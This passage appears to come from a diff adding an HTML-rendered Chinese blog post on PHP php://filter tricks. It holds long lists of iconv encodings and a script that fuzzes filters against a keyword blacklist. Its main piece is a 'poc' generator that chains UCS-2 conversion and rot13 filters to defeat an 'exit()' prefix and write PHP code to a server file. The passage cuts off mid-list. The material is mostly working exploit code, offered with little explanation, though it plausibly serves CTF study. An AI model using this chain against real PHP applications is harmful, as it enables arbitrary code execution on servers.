+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span>
+<span class="hljs-attribute">UTF7</span>-IMAP
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>
+<span class="hljs-attribute">ASCII</span>
+<span class="hljs-attribute">EUC</span>-JP
+<span class="hljs-attribute">SJIS</span>
+<span class="hljs-attribute">eucJP</span>-win
+<span class="hljs-attribute">SJIS</span>-win
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
+<span class="hljs-attribute">CP932</span>
+<span class="hljs-attribute">CP51932</span>
+<span class="hljs-attribute">SJIS</span>-mac
+<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO
+<span class="hljs-attribute">SJIS</span>-Mobile#KDDI
+<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI
+<span class="hljs-attribute">JIS</span>
+<span class="hljs-attribute">JIS</span>-ms
+<span class="hljs-attribute">CP50220</span>
+<span class="hljs-attribute">CP50220raw</span>
+<span class="hljs-attribute">CP50221</span>
+<span class="hljs-attribute">CP50222</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
+<span class="hljs-attribute">byte2be</span>
+<span class="hljs-attribute">byte2le</span>
+<span class="hljs-attribute">byte4be</span>
+<span class="hljs-attribute">byte4le</span>
+<span class="hljs-attribute">BASE64</span>
+<span class="hljs-attribute">HTML</span>-ENTITIES
+<span class="hljs-attribute">7bit</span>
+<span class="hljs-attribute">8bit</span>
+<span class="hljs-attribute">EUC</span>-CN
+<span class="hljs-attribute">CP936</span>
+<span class="hljs-attribute">GB18030</span>
+<span class="hljs-attribute">HZ</span>
+<span class="hljs-attribute">EUC</span>-TW
+<span class="hljs-attribute">CP950</span>
+<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">EUC</span>-KR
+<span class="hljs-attribute">UHC</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>
+<span class="hljs-attribute">CP866</span>
+<span class="hljs-attribute">KOI8</span>-R
+<span class="hljs-attribute">KOI8</span>-U
+<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div>
+
+
+
+<h3 id="phpfuzz过滤器"><a href="#phpfuzz过滤器" class="headerlink" title="phpfuzz过滤器"></a>phpfuzz过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$a</span> = [
+    <span class="hljs-string">&#x27;string.rot13&#x27;</span>,
+    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
+    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
+    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
+	  <span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>,
+	  <span class="hljs-string">&#x27;convert.quoted-printable-decode&#x27;</span>,
+    <span class="hljs-string">&#x27;zlib.deflate&#x27;</span>,
+    <span class="hljs-string">&#x27;zlib.inflate&#x27;</span>,
+    <span class="hljs-string">&#x27;bzip2.compress&#x27;</span>,
+    <span class="hljs-string">&#x27;bzip2.decompress&#x27;</span>,
+    <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
+    <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
+    <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
+    <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
+    <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
+    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
+    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
+    <span class="hljs-string">&#x27;CP932&#x27;</span>,
+    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
+    <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
+    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
+    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
+    <span class="hljs-string">&#x27;7bit&#x27;</span>,
+    <span class="hljs-string">&#x27;8bit&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
+    <span class="hljs-string">&#x27;CP936&#x27;</span>,
+    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
+    <span class="hljs-string">&#x27;HZ&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
+    <span class="hljs-string">&#x27;CP950&#x27;</span>,
+    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;UHC&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
+    <span class="hljs-string">&#x27;CP866&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
+    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
+];
+<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
+    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$item</span>))
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$item</span>,<span class="hljs-string">&quot;\n&quot;</span>;
+&#125;</code></pre></div>
+
+
+
+<h3 id="poc生成脚本："><a href="#poc生成脚本：" class="headerlink" title="poc生成脚本："></a>poc生成脚本：</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [
+        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,
+        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,
+        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,
+        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [
+        <span class="hljs-string">&#x27;deflate&#x27;</span>,
+        <span class="hljs-string">&#x27;inflate&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [
+        <span class="hljs-string">&#x27;compress&#x27;</span>,
+        <span class="hljs-string">&#x27;decompress&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [
+        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
+        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
+        <span class="hljs-string">&#x27;ASCII&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS&#x27;</span>,
+        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
+        <span class="hljs-string">&#x27;CP932&#x27;</span>,
+        <span class="hljs-string">&#x27;CP51932&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
+        <span class="hljs-string">&#x27;JIS&#x27;</span>,
+        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50220&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50221&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50222&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
+        <span class="hljs-string">&#x27;byte2be&#x27;</span>,
+        <span class="hljs-string">&#x27;byte2le&#x27;</span>,
+        <span class="hljs-string">&#x27;byte4be&#x27;</span>,
+        <span class="hljs-string">&#x27;byte4le&#x27;</span>,
+        <span class="hljs-string">&#x27;BASE64&#x27;</span>,
+        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
+        <span class="hljs-string">&#x27;7bit&#x27;</span>,
+        <span class="hljs-string">&#x27;8bit&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
+        <span class="hljs-string">&#x27;CP936&#x27;</span>,
+        <span class="hljs-string">&#x27;GB18030&#x27;</span>,
+        <span class="hljs-string">&#x27;HZ&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
+        <span class="hljs-string">&#x27;CP950&#x27;</span>,
+        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
+        <span class="hljs-string">&#x27;UHC&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
+        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
+        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
+        <span class="hljs-string">&#x27;CP866&#x27;</span>,
+        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
+        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
+        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [
+        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [
+            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
+            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>
+        ],
+
+        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);
+    &#125;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;
+        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;
+
+        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;
+                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);
+                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
+            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;
+                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);
+                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
+
+            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;
+                ;
+            &#125;
+        &#125;
+
+        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;
+
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;
+        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;
+
+        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;
+            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:
+                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;
+                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;
+                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);
+                &#125;
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">default</span>:
+                ;
+        &#125;
+        
+        <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;
+        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;
+    &#125;
+&#125;
+
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();
+<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div>
+
+
+
+<h3 id="zlib-deflate与zlib-inflate"><a href="#zlib-deflate与zlib-inflate" class="headerlink" title="zlib.deflate与zlib.inflate"></a>zlib.deflate与zlib.inflate</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$a</span> = [
+    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
+    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
+    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
+    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
+    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
+    <span class="hljs-string">&#x27;CP932&#x27;</span>,
+    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
+    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
+    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
+    <span class="hljs-string">&#x27;7bit&#x27;</span>,
+    <span class="hljs-string">&#x27;8bit&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
+    <span class="hljs-string">&#x27;CP936&#x27;</span>,
+    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
+    <span class="hljs-string">&#x27;HZ&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
+    <span class="hljs-string">&#x27;CP950&#x27;</span>,
+    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;UHC&#x27;</span>,
